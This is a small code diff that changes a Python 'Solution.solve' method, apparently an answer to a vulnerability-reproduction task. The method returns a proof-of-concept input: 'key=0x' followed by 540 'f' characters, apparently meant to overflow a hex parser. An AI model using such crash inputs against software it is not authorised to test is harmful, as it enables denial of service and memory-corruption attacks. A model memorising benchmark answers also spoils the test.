@@ -1,4 +1,5 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b"0x" + b"deadbeef" * 68 + b"f"
-        return poc
+        header = b"key=0x"
+        hex_payload = b"f" * 540
+        return header + hex_payload
